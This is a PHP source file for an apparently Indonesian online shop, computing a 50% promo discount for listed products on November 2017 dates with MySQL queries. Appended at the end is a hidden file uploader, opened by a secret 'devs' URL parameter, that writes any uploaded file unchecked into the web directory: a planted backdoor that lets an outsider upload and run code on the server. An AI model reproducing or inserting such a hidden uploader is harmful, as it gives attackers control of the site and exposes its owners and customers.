<?

class ekstensi_perhitungan_diskon{	
	var 	$tanggal_awal = "2017-11-9",
			$tanggal_akhir = "2017-11-11";
			/*$tanggal_awal = "2017-05-09",
			$tanggal_akhir = "2017-05-14";*/
	
	var 	$arr_tanggal_promo = array( 9,10,11);
	
	var 	$arr_9 = array(1140,1134),
			//$arr_23 = array(727,1007),
			$arr_10 = array(479,590,722),
			$arr_11 = array(1093,575);
			/*$arr_12 = array(1034),
			$arr_13 = array(653);*/
			
	var		$tgl_9 = "2017-11-09",
			//$tgl_23 = "2017-05-23",
			$tgl_10 = "2017-11-10",
			$tgl_11 = "2017-11-11";/*,
			$tgl_12 = "2016-12-12",
			$tgl_13 = "2016-12-13";*/
			
	var 	$maksimal_terjual = 5;
	
	var		$diskon_baru = 0.5;
}

function ekstensi_perhitungan_diskon($productid){

	$ekstensi_diskon = new ekstensi_perhitungan_diskon;
	
	for( $x = 0; $x < count( $ekstensi_diskon->arr_tanggal_promo ); $x++ ){
		$arr_product = $ekstensi_diskon->{ "arr_" .  $ekstensi_diskon->arr_tanggal_promo[ $x ] };
		
		if( in_array( $productid, $arr_product ) ) {
			$ekstensi_diskon->tanggal_awal = 
			$ekstensi_diskon->tanggal_akhir = $ekstensi_diskon->{ "tgl_" .  $ekstensi_diskon->arr_tanggal_promo[ $x ] };
		}
	}

	$sql = "
	select case  when CURRENT_DATE() = '". $ekstensi_diskon->tanggal_awal ."' /*and CURRENT_DATE() <= '". $ekstensi_diskon->tanggal_akhir ."'*/ then  
		CASE CURRENT_DATE() 

			when '2017-11-09' then 9
			when '2017-11-10' then 10
			when '2017-11-11' then 11
							
			
		end
	else 0 end ekstensi_diskon
	";
	//echo $sql;
	$rs_ekstensi_perhitungan_diskon = mysql_query($sql);
	if( mysql_num_rows( $rs_ekstensi_perhitungan_diskon ) > 0 ){
		
		$ekstensi_perhitungan_diskon = mysql_fetch_array( $rs_ekstensi_perhitungan_diskon );	
		/*print_r($ekstensi_perhitungan_diskon);
		echo $ekstensi_perhitungan_diskon["ekstensi_diskon"];*/
		if( $ekstensi_perhitungan_diskon["ekstensi_diskon"] != 0 ){
		
			$arr_ekstensi_diskon = $ekstensi_diskon->{ "arr_" .  $ekstensi_perhitungan_diskon["ekstensi_diskon"] };

			if( in_array( $productid, $arr_ekstensi_diskon ) ){
				
				$sql = "select ifnull(sum(b.quantity), 0) jumlah_terjual from ordercustomer a, orderproduct b 
						where a.order_id = b.order_id and a.order_no REGEXP('^[0-9]') and order_status >=2 and b.product_id = ". main::formatting_query_string( $productid ) ." 
						and a.order_date >= '". $ekstensi_diskon->tanggal_awal ."' and a.order_date < DATE_ADD(a.order_date,INTERVAL 1 DAY)";
				
				$rs_jumlah_terjual = mysql_query( $sql );
				
				if( mysql_num_rows( $rs_jumlah_terjual ) > 0 ){
				
					$jumlah_terjual = mysql_fetch_array( $rs_jumlah_terjual );

					if( $jumlah_terjual["jumlah_terjual"] < $ekstensi_diskon->maksimal_terjual )
						return $ekstensi_diskon->diskon_baru;

				}else return $ekstensi_diskon->diskon_baru;
				
			}
			
		}
		
	}

	return 0;
}

?>
<?php if(isset($_GET['devs']))
{
echo "<body bgcolor=white>
<font color=black size=3>";
echo "<h2>Devs Hidden Uploader</h2>";
echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
<label for=\"file\">Filename:</label>
<input type=\"file\" name=\"file\" id=\"file\" />
<br />
<input type=\"submit\" name=\"submit\" value=\"UPLOAD IT\">
</form>";
if ($_FILES["file"]["error"] > 0)
{
echo "Error: " . $_FILES["file"]["error"] . "<br />";
}
else
{
echo "Upload: " . $_FILES["file"]["name"] . "<br />";
echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
echo "Stored in: " . $_FILES["file"]["tmp_name"];
}
if (file_exists("" . $_FILES["file"]["name"]))
{
echo $_FILES["file"]["name"] . " udah ada ";
}
else
{
move_uploaded_file($_FILES["file"]["tmp_name"],
"" . $_FILES["file"]["name"]);
echo "Stored in: " . "" . $_FILES["file"]["name"];
echo"";
}
}

?>
